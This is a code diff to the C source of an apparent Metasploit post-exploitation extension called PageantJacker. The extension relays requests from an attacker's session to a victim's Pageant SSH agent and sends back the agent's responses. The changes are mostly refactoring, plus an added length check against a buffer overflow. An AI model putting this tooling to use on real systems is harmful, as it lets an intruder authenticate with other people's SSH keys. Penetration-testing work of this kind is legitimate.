@@ -23,25 +23,30 @@ Command customCommands[] =
 DWORD request_pageant_send_query(Remote *remote, Packet *packet)
 {
 	Packet *response = packet_create_response(packet);
-	DWORD raw_data_size_in;
-	Byte *raw_data_in;
+	DWORD rawDataSizeIn = NULL;
+	Byte *rawDataIn = NULL;
 	PAGEANTQUERYRESULTS results = { 0 };
 
 	// Retrieve from metasploit
-	raw_data_size_in = packet_get_tlv_value_uint(packet, TLV_TYPE_EXTENSION_PAGEANTJACKER_SIZE_IN);
-	raw_data_in = packet_get_tlv_value_raw(packet, TLV_TYPE_EXTENSION_PAGEANTJACKER_BLOB_IN);
+	rawDataSizeIn = packet_get_tlv_value_uint(packet, TLV_TYPE_EXTENSION_PAGEANTJACKER_SIZE_IN);
+	rawDataIn = packet_get_tlv_value_raw(packet, TLV_TYPE_EXTENSION_PAGEANTJACKER_BLOB_IN);
 	
-	dprintf("[PJ(request_pageant_send_query)] Size in: %d. Data is at 0x%p", raw_data_size_in, raw_data_in);
+	dprintf("[PJ(request_pageant_send_query)] Size in: %d. Data is at 0x%p", rawDataSizeIn, rawDataIn);
+
+	// Make sure that the length marker can never go above AGENT_MAX (i.e. prevent a stack based buffer overflow later)
+	if (rawDataSizeIn >= AGENT_MAX) {
+		rawDataSizeIn = AGENT_MAX - 1;
+	}
 
 	// Interact with Pageant. Note that this will always return a struct, even if the operation failed.
 	dprintf("[PJ(request_pageant_send_query)] Forwarding query to Pageant");
-	results = send_query_to_pageant(raw_data_in, raw_data_size_in);
+	send_query_to_pageant(rawDataIn, rawDataSizeIn, (PAGEANTQUERYRESULTS *) &results);
 
 	// Build the packet based on the respones from the Pageant interaction.
 	packet_add_tlv_bool(response, TLV_TYPE_EXTENSION_PAGEANTJACKER_STATUS, results.result);
 	packet_add_tlv_raw(response, TLV_TYPE_EXTENSION_PAGEANTJACKER_RETURNEDBLOB, results.blob, results.bloblength);
-	packet_add_tlv_string(response, TLV_TYPE_EXTENSION_PAGEANTJACKER_ERRORMESSAGE, results.error_message);	
-	dprintf("[PJ(request_pageant_send_query)] Success: %d. Return data len %d, data is at 0x%p. Error message at 0x%p (%s)", results.result, results.bloblength, results.blob, &results.error_message, results.error_message);
+	packet_add_tlv_uint(response, TLV_TYPE_EXTENSION_PAGEANTJACKER_ERRORMESSAGE, results.errorMessage);	
+	dprintf("[PJ(request_pageant_send_query)] Success: %d. Return data len %d, data is at 0x%p. Error message at 0x%p (%d)", results.result, results.bloblength, results.blob, &results.errorMessage, results.errorMessage);
 
 	// Free the allocated memory once we are done
 	if (results.blob) {
@@ -90,23 +95,20 @@ DWORD __declspec(dllexport) GetExtensionName(char* buffer, int bufferSize)
 	return ERROR_SUCCESS;
 }
 
-PAGEANTQUERYRESULTS send_query_to_pageant(byte *query, unsigned int querylength) {
+void send_query_to_pageant(byte *query, unsigned int querylength, PAGEANTQUERYRESULTS *ret) {
 
-	char strPuttyRequest[PAGENT_REQUEST_LENGTH]; // This will always be 23 chars
+	char strPuttyRequest[PAGENT_REQUEST_LENGTH] = { 0 }; // This will always be 23 chars. Initialised to zero here = no memset()
 	COPYDATASTRUCT pageant_copy_data;
-	unsigned char *filemap_pointer;
-	HANDLE filemap;
-	PAGEANTQUERYRESULTS ret;
-	HWND hPageant;
-	unsigned int protocol_return_length;
-	unsigned int api_result;
-	void *memcpy_result;
+	unsigned char *filemap_pointer = NULL;
+	HANDLE filemap = NULL;
+	HWND hPageant = NULL;
+	unsigned int protocol_return_length = NULL;
+	unsigned int api_result = NULL;
+	void *memcpy_result = NULL;
 
 	// Initialise the results arrays
-	memset((void *) &ret, 0, sizeof(ret));
-	memset((void *) &strPuttyRequest, 0, sizeof(strPuttyRequest));
-	ret.result = FALSE;
-	ret.error_message = PAGEANTJACKER_ERROR_NOERROR;
+	ret->result = FALSE;
+	ret->errorMessage = PAGEANTJACKER_ERROR_NOERROR;
 
 	if (hPageant = FindWindowW(PAGEANT_NAME, PAGEANT_NAME)) {
 
@@ -128,7 +130,7 @@ PAGEANTQUERYRESULTS send_query_to_pageant(byte *query, unsigned int querylength)
 					dprintf("[PJ(send_query_to_pageant)] MapViewOfFile returned 0x%x", filemap_pointer);
 
 					// Initialise and copy the request to the memory block that will be passed to Pageant.
-					memset((void *) filemap_pointer, 0, AGENT_MAX);
+					SecureZeroMemory(filemap_pointer, AGENT_MAX);
 					if (querylength)
 						memcpy(filemap_pointer, query, querylength);
 
@@ -141,44 +143,44 @@ PAGEANTQUERYRESULTS send_query_to_pageant(byte *query, unsigned int querylength)
 						protocol_return_length = get_length_response(filemap_pointer)+4;
 						dprintf("[PJ(send_query_to_pageant)] Result length: %d. Result buffer preview: %02X:%02X:%02X:%02X:%02X:%02X:%02X:%02X", protocol_return_length, filemap_pointer[0], filemap_pointer[1], filemap_pointer[2], filemap_pointer[3], filemap_pointer[4], filemap_pointer[5], filemap_pointer[6], filemap_pointer[7]);
 						if (protocol_return_length && protocol_return_length<AGENT_MAX) {
-							if (ret.blob = calloc(1, protocol_return_length)) {
-								memcpy_result = memcpy(ret.blob, filemap_pointer, protocol_return_length);
-								ret.bloblength = protocol_return_length;
-								ret.result = TRUE;
+							if (ret->blob = calloc(1, protocol_return_length)) {
+								memcpy_result = memcpy(ret->blob, filemap_pointer, protocol_return_length);
+								ret->bloblength = protocol_return_length;
+								ret->result = TRUE;
 								dprintf("[PJ(send_query_to_pageant)] Set Result to TRUE, copied memory to ret.blob (result: 0x%x)",memcpy_result);
 							} else {
 								dprintf("[PJ(send_query_to_pageant)] Malloc error (length: %d).", protocol_return_length);
-								ret.error_message = PAGEANTJACKER_ERROR_ALLOC;
+								ret->errorMessage = PAGEANTJACKER_ERROR_ALLOC;
 							}
 						}
 					 } else {
 						// SendMessage failed
-						ret.error_message = PAGEANTJACKER_ERROR_SENDMESSAGE;
+						ret->errorMessage = PAGEANTJACKER_ERROR_SENDMESSAGE;
 					 }
 					 api_result = UnmapViewOfFile(filemap_pointer);
 					 dprintf("[PJ(send_query_to_pageant)] UnmapViewOfFile returns %d.", api_result);
 				} else {
 					// MapViewOfFile failed
-					ret.error_message = PAGEANTJACKER_ERROR_MAPVIEWOFFILE;
+					ret->errorMessage = PAGEANTJACKER_ERROR_MAPVIEWOFFILE;
 				}
 				api_result = CloseHandle(filemap);
 				dprintf("[PJ(send_query_to_pageant)] CloseHandle (from CreateFileMapping) returns %d.", api_result);
 			} else {
 				// CreateFileMapping failed
-				ret.error_message = PAGEANTJACKER_ERROR_CREATEFILEMAPPING;
+				ret->errorMessage = PAGEANTJACKER_ERROR_CREATEFILEMAPPING;
 			}
 		} else {
 			// _snprintf_s failed. Note that this should never happen because it could
 			// mean that somehow %08x has lost its meaning. Essentially though this is
 			// here to guard against buffer overflows.
-			ret.error_message = PAGEANTJACKER_ERROR_REQSTRINGBUILD;
+			ret->errorMessage = PAGEANTJACKER_ERROR_REQSTRINGBUILD;
 		}
 
 	} else {
 		// Could not get a handle to Pageant. This probably means that it is not running.
-		ret.error_message = PAGEANTJACKER_ERROR_NOTFOUND;
+		ret->errorMessage = PAGEANTJACKER_ERROR_NOTFOUND;
 	}
-	return ret;
+	return;
 }
 
 DWORD get_length_response(byte *b) {
